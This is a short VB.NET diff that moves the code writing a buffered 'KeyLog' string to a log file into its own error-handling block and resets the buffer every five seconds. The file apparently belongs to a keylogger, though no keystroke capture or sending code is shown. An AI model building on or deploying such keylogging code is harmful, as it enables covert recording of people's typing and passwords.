@@ -114,11 +114,16 @@
                     If info.Length >= 50000 Then
                         info.Delete()
                     End If
-                    My.Computer.FileSystem.WriteAllText(filepath, KeyLog, True)
-                    KeyLog = ""
                 Catch
                 End Try
 
+                Try
+                    My.Computer.FileSystem.WriteAllText(filepath, KeyLog, True)
+                Catch
+                End Try
+
+                'Reset 
+                KeyLog = ""
                 Threading.Thread.Sleep(5000)
             End While
         End Sub
